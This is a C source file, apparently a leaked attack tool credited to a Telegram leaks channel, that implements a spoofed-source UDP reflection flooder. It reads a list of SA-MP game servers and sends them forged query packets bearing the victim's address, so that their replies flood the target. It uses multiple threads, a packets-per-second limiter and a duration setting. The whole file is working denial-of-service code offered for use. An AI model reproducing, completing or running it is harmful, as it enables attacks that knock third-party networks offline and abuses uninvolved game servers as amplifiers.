//@rpp33 - cat leaks: https://t.me/catleaks
#include <time.h>

#include <pthread.h>

#include <unistd.h>

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <sys/socket.h>

#include <netinet/ip.h>

#include <netinet/udp.h>

#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096 //def 8192
#define PHI 0x9e3779b9

//new struct 
int attport;
char * src_ip; //global char
char * dst_ip; //global char
char * dstip;
int dst_port;
char datagram[MAX_PACKET_SIZE];
struct iphdr * iph = (struct iphdr * ) datagram;
unsigned short int udp4_checksum(struct iphdr * iph, struct udphdr * udph, unsigned char * , int);
unsigned short int checksum(unsigned short int * , int);
unsigned short csum(unsigned short * buf, int nwords);
unsigned char encrBuffer[4092];

//

//samp
char packet_dup[4];
unsigned char ip[4]; //global ip

unsigned char ipport[2]; //global ip
unsigned char sampEncrTable[256] =
{
	0x27, 0x69, 0xFD, 0x87, 0x60, 0x7D, 0x83, 0x02, 0xF2, 0x3F, 0x71, 0x99, 0xA3, 0x7C, 0x1B, 0x9D,
	0x76, 0x30, 0x23, 0x25, 0xC5, 0x82, 0x9B, 0xEB, 0x1E, 0xFA, 0x46, 0x4F, 0x98, 0xC9, 0x37, 0x88,
	0x18, 0xA2, 0x68, 0xD6, 0xD7, 0x22, 0xD1, 0x74, 0x7A, 0x79, 0x2E, 0xD2, 0x6D, 0x48, 0x0F, 0xB1,
	0x62, 0x97, 0xBC, 0x8B, 0x59, 0x7F, 0x29, 0xB6, 0xB9, 0x61, 0xBE, 0xC8, 0xC1, 0xC6, 0x40, 0xEF,
	0x11, 0x6A, 0xA5, 0xC7, 0x3A, 0xF4, 0x4C, 0x13, 0x6C, 0x2B, 0x1C, 0x54, 0x56, 0x55, 0x53, 0xA8,
	0xDC, 0x9C, 0x9A, 0x16, 0xDD, 0xB0, 0xF5, 0x2D, 0xFF, 0xDE, 0x8A, 0x90, 0xFC, 0x95, 0xEC, 0x31,
	0x85, 0xC2, 0x01, 0x06, 0xDB, 0x28, 0xD8, 0xEA, 0xA0, 0xDA, 0x10, 0x0E, 0xF0, 0x2A, 0x6B, 0x21,
	0xF1, 0x86, 0xFB, 0x65, 0xE1, 0x6F, 0xF6, 0x26, 0x33, 0x39, 0xAE, 0xBF, 0xD4, 0xE4, 0xE9, 0x44,
	0x75, 0x3D, 0x63, 0xBD, 0xC0, 0x7B, 0x9E, 0xA6, 0x5C, 0x1F, 0xB2, 0xA4, 0xC4, 0x8D, 0xB3, 0xFE,
	0x8F, 0x19, 0x8C, 0x4D, 0x5E, 0x34, 0xCC, 0xF9, 0xB5, 0xF3, 0xF8, 0xA1, 0x50, 0x04, 0x93, 0x73,
	0xE0, 0xBA, 0xCB, 0x45, 0x35, 0x1A, 0x49, 0x47, 0x6E, 0x2F, 0x51, 0x12, 0xE2, 0x4A, 0x72, 0x05,
	0x66, 0x70, 0xB8, 0xCD, 0x00, 0xE5, 0xBB, 0x24, 0x58, 0xEE, 0xB4, 0x80, 0x81, 0x36, 0xA9, 0x67,
	0x5A, 0x4B, 0xE8, 0xCA, 0xCF, 0x9F, 0xE3, 0xAC, 0xAA, 0x14, 0x5B, 0x5F, 0x0A, 0x3B, 0x77, 0x92,
	0x09, 0x15, 0x4E, 0x94, 0xAD, 0x17, 0x64, 0x52, 0xD3, 0x38, 0x43, 0x0D, 0x0C, 0x07, 0x3C, 0x1D,
	0xAF, 0xED, 0xE7, 0x08, 0xB7, 0x03, 0xE6, 0x8E, 0xAB, 0x91, 0x89, 0x3E, 0x2C, 0x96, 0x42, 0xD9,
	0x78, 0xDF, 0xD0, 0x57, 0x5D, 0x84, 0x41, 0x7E, 0xCE, 0xF7, 0x32, 0xC3, 0xD5, 0x20, 0x0B, 0xA7
};

void kyretardizeDatagram(unsigned char * buf, int len, int port, int unk) {
  memcpy(encrBuffer, buf, len);

  unsigned char bChecksum = 0;
  int i;
  for (i = 0; i < len; i++) {
    unsigned char bData = buf[i];
    bChecksum ^= (bData & 0xAA);
  }
  encrBuffer[0] = bChecksum;

  unsigned char * buf_nocrc = & encrBuffer[1];
  memcpy(buf_nocrc, buf, len);

  unsigned char bPort = port ^ 0xCCCC;
  unsigned char c = 0;
  for (i = 0; i < len; i++) {
    unsigned char bCurByte = buf_nocrc[i];
    unsigned char bCrypt = sampEncrTable[bCurByte];
    buf_nocrc[i] = bCrypt;

    if (unk) {
      c = bPort ^ bCrypt;
      buf_nocrc[i] = c;

      --unk;
    } else {
      c = unk ^ bCrypt;
      buf_nocrc[i] = bCrypt;

      unk = 1;
    }
  }
}

static uint32_t Q[4096], c = 362436;
struct list {
  struct sockaddr_in data;
  struct list * next;
  struct list * prev;
};

void makeArrayIP(char * inIP, char * outIP) {
  short i, nTemp = 0;
  char cbool = 0;
  for (i = 0; inIP[i] != 0; i++) {
    if (inIP[i] != '.') {
      nTemp = nTemp * 10 + (short)(inIP[i] - '0');
    } else {
      outIP[cbool] = (char) nTemp;
      nTemp = 0; /*Reiniciar el valor temporal*/
      cbool++;
    }
  }
  outIP[cbool] = (char) nTemp;
}

struct list * head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data {
  int thread_id;
  struct list * list_node;
  struct sockaddr_in sin;
};

void init_rand(uint32_t x) {
  int i;
  Q[0] = x;
  Q[1] = x + PHI;
  Q[2] = x + PHI + PHI;
  for (i = 3; i < 4096; i++) {
    Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
  }
}

uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
unsigned short csum(unsigned short * buf, int nwords) {
  unsigned long sum;

  for (sum = 0; nwords > 0; nwords--)
    sum += * buf++;

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

void setup_ip_header(struct iphdr * iph) {
  iph -> ihl = 5;
  iph -> version = 4;
  iph -> tos = 0;
  iph -> id = htonl(8000 + rand() % 40000);
  iph -> frag_off = 0;
  iph -> ttl = (rand() % 40) + 70;
  iph -> protocol = IPPROTO_UDP;
  iph -> saddr = inet_addr(src_ip);
  iph -> check = csum((unsigned short * ) datagram, iph -> tot_len >> 1); //valid check
  //iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 8;//NEED DELETE
}

void samp_query_i(struct udphdr * udph) {
  void * data = (void * ) udph + sizeof(struct udphdr);
  strtok(dst_ip, ":");
  makeArrayIP(dst_ip, & ip[0]);
  packet_dup[0] = ip[0];
  packet_dup[1] = ip[1];
  packet_dup[2] = ip[2];
  packet_dup[3] = ip[3];
  strcpy(data, "SAMP");
  memset(data + 4, packet_dup[0], 1);
  memset(data + 5, packet_dup[1], 1);
  memset(data + 6, packet_dup[2], 1);
  memset(data + 7, packet_dup[3], 1);
  // *(unsigned short*)(data + 8) = dst_port >> 8 & 0xFF;// old?
  //*(unsigned short*)(data + 9) = dst_port & 0xFF;// old??

  *(unsigned short * )(data + 8) = dst_port & 0xFF;
  *(unsigned short * )(data + 9) = dst_port >> 8 & 0xFF;

  strcpy(data + 10, "i"); //0x69

  udph -> len = htons(sizeof(struct udphdr) + 11);
  udph -> check = udp4_checksum(iph, udph, data, 11);
}

void samp_query_r(struct udphdr * udph) {
  void * data = (void * ) udph + sizeof(struct udphdr);
  strtok(dst_ip, ":");
  makeArrayIP(dst_ip, & ip[0]);
  packet_dup[0] = ip[0];
  packet_dup[1] = ip[1];
  packet_dup[2] = ip[2];
  packet_dup[3] = ip[3];
  strcpy(data, "SAMP");
  memset(data + 4, packet_dup[0], 1);
  memset(data + 5, packet_dup[1], 1);
  memset(data + 6, packet_dup[2], 1);
  memset(data + 7, packet_dup[3], 1);
  // *(unsigned short*)(data + 8) = dst_port >> 8 & 0xFF;
  //*(unsigned short*)(data + 9) = dst_port & 0xFF;

  *(unsigned short * )(data + 8) = dst_port & 0xFF;
  *(unsigned short * )(data + 9) = dst_port >> 8 & 0xFF;

  strcpy(data + 10, "r"); //0x72

  udph -> len = htons(sizeof(struct udphdr) + 11);
  udph -> check = udp4_checksum(iph, udph, data, 11);
}

void samp_query_c(struct udphdr * udph) {
  void * data = (void * ) udph + sizeof(struct udphdr);
  strtok(dst_ip, ":");
  makeArrayIP(dst_ip, & ip[0]);
  packet_dup[0] = ip[0];
  packet_dup[1] = ip[1];
  packet_dup[2] = ip[2];
  packet_dup[3] = ip[3];
  strcpy(data, "SAMP");
  memset(data + 4, packet_dup[0], 1);
  memset(data + 5, packet_dup[1], 1);
  memset(data + 6, packet_dup[2], 1);
  memset(data + 7, packet_dup[3], 1);
  // *(unsigned short*)(data + 8) = dst_port >> 8 & 0xFF;// old?
  //*(unsigned short*)(data + 9) = dst_port & 0xFF;// old??

  *(unsigned short * )(data + 8) = dst_port & 0xFF;
  *(unsigned short * )(data + 9) = dst_port >> 8 & 0xFF;

  strcpy(data + 10, "c"); //0x63

  udph -> len = htons(sizeof(struct udphdr) + 11);
  udph -> check = udp4_checksum(iph, udph, data, 11);
}
void samp_query_p(struct udphdr * udph) {
  void * data = (void * ) udph + sizeof(struct udphdr);
  strtok(dst_ip, ":");
  makeArrayIP(dst_ip, & ip[0]);
  packet_dup[0] = ip[0];
  packet_dup[1] = ip[1];
  packet_dup[2] = ip[2];
  packet_dup[3] = ip[3];
  strcpy(data, "SAMP");
  memset(data + 4, packet_dup[0], 1);
  memset(data + 5, packet_dup[1], 1);
  memset(data + 6, packet_dup[2], 1);
  memset(data + 7, packet_dup[3], 1);
  // *(unsigned short*)(data + 8) = dst_port >> 8 & 0xFF;// old?
  //*(unsigned short*)(data + 9) = dst_port & 0xFF;// old??

  *(unsigned short * )(data + 8) = dst_port & 0xFF;
  *(unsigned short * )(data + 9) = dst_port >> 8 & 0xFF;

  strcpy(data + 10, "p"); //0x70
  memset(data + 11, (char)(rand() & 0xFFFF), 1); //CAT
  memset(data + 12, (char)(rand() >> 8 & 0xFFFF), 1); //CAT
  memset(data + 13, (char)(rand() & 0xFFFF), 1); //CAT
  memset(data + 14, 0x09, 1); //ping 037

  udph -> len = htons(sizeof(struct udphdr) + 15);
  udph -> check = udp4_checksum(iph, udph, data, 15); //CAT
}

void * flood(void * par1) {
  struct thread_data * td = (struct thread_data * ) par1;
  int tmp = 1;
  const int * val = & tmp;
  struct udphdr * udph = (void * ) iph + sizeof(struct iphdr);
  struct sockaddr_in sin = td -> sin;
  struct list * list_node = td -> list_node;
  int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
  register unsigned int i;

  if (s < 0) {
    fprintf(stderr, "Could not open raw socket.\n");
    exit(-1);
  }

  //init_rand(time(NULL));

  memset(datagram, 0, MAX_PACKET_SIZE);

  udph -> dest = htons(list_node -> data.sin_port);
  iph -> saddr = sin.sin_addr.s_addr;
  iph -> daddr = list_node -> data.sin_addr.s_addr;
  //	iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
  iph -> check = csum((unsigned short * ) datagram, iph -> tot_len);

  if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0) {
    fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
    exit(-1);
  }

  init_rand(time(NULL));

  i = 0;

  while (1) {
    iph -> daddr = list_node -> data.sin_addr.s_addr;
    udph -> source = attport;
    setup_ip_header(iph);

    samp_query_i(udph);
    iph -> tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 11;
    sendto(s, datagram, iph -> tot_len, 0, (struct sockaddr * ) & list_node -> data, sizeof(list_node -> data));

    samp_query_p(udph);
    iph -> tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 15;
    sendto(s, datagram, iph -> tot_len, 0, (struct sockaddr * ) & list_node -> data, sizeof(list_node -> data));

    samp_query_c(udph);
    iph -> tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 11;
    sendto(s, datagram, iph -> tot_len, 0, (struct sockaddr * ) & list_node -> data, sizeof(list_node -> data));

    samp_query_r(udph);
    iph -> tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 11;
    sendto(s, datagram, iph -> tot_len, 0, (struct sockaddr * ) & list_node -> data, sizeof(list_node -> data));

    list_node = list_node -> next;
    udph -> dest = htons(list_node -> data.sin_port);
    iph -> daddr = list_node -> data.sin_addr.s_addr;

    pps++;
    if (i >= limiter) {
      i = 0;
      usleep(sleeptime);
    }
    i++;
  }
}
int main(int argc, char * argv[]) {
  if (argc < 6) {
    fprintf(stderr, "Invalid parameters! Leaked by @rpp33 - t.me/catleaks\n");
    fprintf(stdout, "Usage: %s <target IP> <target port> <reflection file> <threads> <pps limiter, -1 for no limit> <time>\n", argv[0]);
    exit(-1);
  }
  srand(time(NULL));
  int i = 0;
  head = NULL;
  fprintf(stdout, "Setting up sockets...\n");
  int max_len = 128;
  char * buffer = (char * ) malloc(max_len);
  buffer = memset(buffer, 0x00, max_len);
  int num_threads = atoi(argv[4]);
  int maxpps = atoi(argv[5]);
  limiter = 0;
  pps = 0;
  int multiplier = 20;
  FILE * list_fd = fopen(argv[3], "r");
  while (fgets(buffer, max_len, list_fd) != NULL) {
    if ((buffer[strlen(buffer) - 1] == '\n') ||
      (buffer[strlen(buffer) - 1] == '\r')) {
      buffer[strlen(buffer) - 1] = 0x00;
      if (head == NULL) {
        dst_ip = strtok(buffer, ":");
        dst_port = atoi(strtok(NULL, ":"));
        head = (struct list * ) malloc(sizeof(struct list));
        bzero( & head -> data, sizeof(head -> data));
        head -> data.sin_addr.s_addr = inet_addr(dst_ip);
        head -> data.sin_port = dst_port;
        head -> next = head;
        head -> prev = head;

      } else {
        dst_ip = strtok(buffer, ":");
        dst_port = atoi(strtok(NULL, ":"));
        struct list * new_node = (struct list * ) malloc(sizeof(struct list));
        memset(new_node, 0x00, sizeof(struct list));
        new_node -> data.sin_addr.s_addr = inet_addr(dst_ip);
        new_node -> data.sin_port = dst_port;
        new_node -> prev = head;
        new_node -> next = head -> next;
        head -> next = new_node;

      }
      i++;
    } else {
      continue;
    }
  }
  struct list * current = head -> next;
  pthread_t thread[num_threads];

  src_ip = argv[1]; //new
  attport = htons(atoi(argv[2]));

  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = attport;
  sin.sin_addr.s_addr = inet_addr(src_ip);

  struct thread_data td[num_threads];
  for (i = 0; i < num_threads; i++) {
    td[i].thread_id = i;
    td[i].sin = sin;
    td[i].list_node = current;
    pthread_create( & thread[i], NULL, & flood, (void * ) & td[i]);
  }
  fprintf(stdout, "Starting flood...\n");
  for (i = 0; i < (atoi(argv[6]) * multiplier); i++) {
    usleep((1000 / multiplier) * 1000);
    if ((pps * multiplier) > maxpps) {
      if (1 > limiter) {
        sleeptime += 100;
      } else {
        limiter--;
      }
    } else {
      limiter++;
      if (sleeptime > 25) {
        sleeptime -= 25;
      } else {
        sleeptime = 0;
      }
    }
    pps = 0;
  }
  return 0;
}

// Build IPv4 UDP pseudo-header and call checksum function.
unsigned short int udp4_checksum(struct iphdr * iph, struct udphdr * udph, unsigned char * payload, int payloadlen) {
  char buf[IP_MAXPACKET];
  char * ptr;
  int chksumlen = 0;
  int i;

  ptr = & buf[0]; // ptr points to beginning of buffer buf

  // Copy source IP address into buf (32 bits)
  memcpy(ptr, & iph -> saddr, sizeof(iph -> saddr));
  ptr += sizeof(iph -> saddr);
  chksumlen += sizeof(iph -> saddr);

  // Copy destination IP address into buf (32 bits)
  memcpy(ptr, & iph -> daddr, sizeof(iph -> daddr));
  ptr += sizeof(iph -> daddr);
  chksumlen += sizeof(iph -> daddr);

  // Copy zero field to buf (8 bits)
  * ptr = 0;
  ptr++;
  chksumlen += 1;

  // Copy transport layer protocol to buf (8 bits)
  memcpy(ptr, & iph -> protocol, sizeof(iph -> protocol));
  ptr += sizeof(iph -> protocol);
  chksumlen += sizeof(iph -> protocol);

  // Copy UDP length to buf (16 bits)
  memcpy(ptr, & udph -> len, sizeof(udph -> len));
  ptr += sizeof(udph -> len);
  chksumlen += sizeof(udph -> len);

  // Copy UDP source port to buf (16 bits)
  memcpy(ptr, & udph -> source, sizeof(udph -> source));
  ptr += sizeof(udph -> source);
  chksumlen += sizeof(udph -> source);

  // Copy UDP destination port to buf (16 bits)
  memcpy(ptr, & udph -> dest, sizeof(udph -> dest));
  ptr += sizeof(udph -> dest);
  chksumlen += sizeof(udph -> dest);

  // Copy UDP length again to buf (16 bits)
  memcpy(ptr, & udph -> len, sizeof(udph -> len));
  ptr += sizeof(udph -> len);
  chksumlen += sizeof(udph -> len);

  // Copy UDP checksum to buf (16 bits)
  // Zero, since we don't know it yet
  * ptr = 0;
  ptr++;
  * ptr = 0;
  ptr++;
  chksumlen += 2;

  // Copy payload to buf
  memcpy(ptr, payload, payloadlen);
  ptr += payloadlen;
  chksumlen += payloadlen;

  // Pad to the next 16-bit boundary
  for (i = 0; i < payloadlen % 2; i++, ptr++) {
    * ptr = 0;
    ptr++;
    chksumlen++;
  }

  return checksum((unsigned short int * ) buf, chksumlen);
}

// Checksum function
unsigned short int checksum(unsigned short int * addr, int len) {
  int nleft = len;
  int sum = 0;
  unsigned short int * w = addr;
  unsigned short int answer = 0;

  while (nleft > 1) {
    sum += * w++;
    nleft -= sizeof(unsigned short int);
  }

  if (nleft == 1) {
    *(unsigned char * )( & answer) = * (unsigned char * ) w;
    sum += answer;
  }

  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}